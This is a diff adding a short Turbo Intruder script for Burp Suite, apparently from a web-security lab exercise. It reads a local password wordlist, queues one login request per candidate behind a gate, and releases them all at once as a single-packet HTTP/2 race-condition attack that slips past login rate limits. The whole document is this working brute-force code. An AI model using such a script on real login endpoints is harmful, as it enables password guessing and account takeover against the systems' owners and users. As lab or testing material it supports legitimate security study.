@@ -1,0 +1,25 @@
+def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # Read the list of candidate passwords from the specified file
+    passwords_file_path = '/Users/akshayravi/Desktop/words.txt'
+    with open(passwords_file_path, 'r') as file:
+        passwords = [line.strip() for line in file]
+    
+    # queue a login request using each password from the wordlist
+    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    
+    # once every request has been queued
+    # invoke engine.openGate() to send all requests in the given gate simultaneously
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
